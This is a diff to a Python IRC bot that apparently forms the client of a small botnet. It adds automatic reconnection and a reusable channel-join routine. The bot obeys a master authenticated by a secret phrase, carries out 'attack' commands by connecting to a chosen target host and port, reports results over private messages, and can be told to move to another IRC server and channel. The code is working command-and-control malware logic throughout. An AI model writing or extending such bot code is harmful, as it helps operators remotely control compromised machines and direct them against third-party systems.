@@ -21,6 +21,23 @@ def checkMaster(response, secretphase, temp_master):
         return ""
 
 
+def joinIRC(irc):
+    # some initialising stuff
+    number = 1
+    nickname = "NotYourSlave"+str(number)
+    irc.send(bytes("USER notabot 8 * : I'm OK\r\n", "utf-8"))
+    irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
+
+    response = (irc.recv(1024)).decode("utf-8")
+    print(response)
+    while "Nickname is already in use" in response:
+        number = number + 1
+        nickname = "NotYourSlave" + str(number)
+        irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
+        response = (irc.recv(1024)).decode("utf-8")
+    irc.send(bytes("JOIN #" + channel + "\r\n", "utf-8"))
+    return nickname
+
 try:
     hostname = sys.argv[1]
     port = int(sys.argv[2])
@@ -31,41 +48,52 @@ except:
     sys.exit(-1)
 
 # connect to irc
+nickname = ""
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-irc.connect((hostname, port))
-irc.setblocking(0)
-
-# some initialising stuff
-number = 1
-nickname = "NotYourSlave"+str(number)
-irc.send(bytes("USER notabot 8 * : I'm OK\r\n", "utf-8"))
-irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
-ready = select.select([irc], [], [], 1) # wait 1 second
-if ready[0]:
-    response = (irc.recv(1024)).decode("utf-8")
-    print(response)
-    while "Nickname is already in use" in response:
-        number = number + 1
-        nickname = "NotYourSlave" + str(number)
-        irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
-        ready = select.select([irc], [], [], 1) # wait 1 second
-        if ready[0]:
-            response = (irc.recv(1024)).decode("utf-8")
-        else: continue
-irc.send(bytes("JOIN #" + channel + "\r\n", "utf-8"))
+# try to connect, wait 5 seconds
+irc.settimeout(5)
+while 1:
+    try:
+        irc.connect((hostname, port))
+        irc.settimeout(None)    # if reached here, it reconnected, yay
+        nickname = joinIRC(irc)
+        break
+    except socket.timeout:
+        print("timeout, time to go home")
+        sys.exit(-1) # timeout, just give up and quit
+    except Exception as e:
+        continue
 
 atk_count = 0
 fail_count = 0
 master = ""
 
 while 1:
-    ready = select.select([irc], [], [], 2) # wait 2 seconds
-    if ready[0]:
-        response = (irc.recv(1024)).decode("utf-8")
-        print(response)
-        master = checkMaster(response, secretphase, master)
-    else:
-        continue
+    response = (irc.recv(1024)).decode("utf-8")
+
+    if response == "":  # if connection is closed
+        # try to reconnect
+        irc.close()
+        irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        irc.settimeout(5)
+        print("attempting to reconnect")
+        while 1:
+            try:
+                irc.connect((hostname, port))
+                irc.settimeout(None)    # if reached here, it reconnected, yay
+                print("reconnection success")
+                nickname = joinIRC(irc)
+                break
+            except socket.timeout:
+                print("timeout, time to go home")
+                sys.exit(-1) # timeout, just give up and quit
+            except Exception as e:
+                continue
+
+
+    print(response)
+    master = checkMaster(response, secretphase, master)
+
 
     if response.split(" ", 1)[0] == "PING":
         argument = response.split(" ", 2)[1]
@@ -86,12 +114,12 @@ while 1:
             atk.connect((atk_host, int(atk_port)))
         except:
             atk.settimeout(None)
-            irc.send(bytes("PRIVMSG " + master + " :attack unsuccessful, count = " + str(1) + "\r\n", "utf-8"))
+            irc.send(bytes("PRIVMSG " + master + " :attack unsuccessful\r\n", "utf-8"))
             atk.close()
             continue
-
+        atk.settimeout(None)
         atk.close()
-        irc.send(bytes("PRIVMSG " + master + "  :attack successful, count = " + str(1) + "\r\n", "utf-8"))
+        irc.send(bytes("PRIVMSG " + master + "  :attack successful\r\n", "utf-8"))
 
     # controller's move
     if "Move" in response and master != "":
@@ -109,29 +137,16 @@ while 1:
                 irc.send(bytes("PRIVMSG " + master + " :move unsuccessful\r\n", "utf-8"))
                 move.close()
                 continue
-
+            move.settimeout(None)
+            irc.send(bytes("PRIVMSG " + master + " :move successful\r\n", "utf-8"))
             irc.send(bytes(b"QUIT\r\n"))
             irc.close()
             irc = move
-
+            hostname = move_host
+            port = int(move_port)
+            channel = move_channel
             # get inside the channel
-            move_number = number
-            move_nickname = "NotYourSlave"+str(move_number)
-            irc.send(bytes("USER notabot 8 * : I'm OK\r\n", "utf-8"))
-            irc.send(bytes("NICK " + move_nickname + "\r\n", "utf-8"))
-            ready = select.select([irc], [], [], 1) # wait 1 second
-            if ready[0]:
-                response = (irc.recv(1024)).decode("utf-8")
-                print(response)
-                while "Nickname is already in use" in response:
-                    move_number = move_number + 1
-                    nickname = "NotYourSlave" + str(move_number)
-                    irc.send(bytes("NICK " + move_nickname + "\r\n", "utf-8"))
-                    ready = select.select([irc], [], [], 1) # wait 1 second
-                    if ready[0]:
-                        response = (irc.recv(1024)).decode("utf-8")
-                    else: continue
-            irc.send(bytes("JOIN #" + move_channel + "\r\n", "utf-8"))
+            joinIRC(irc)
         except:
             irc.send(bytes("PRIVMSG " + master + " :move unsuccessful\r\n", "utf-8"))
 
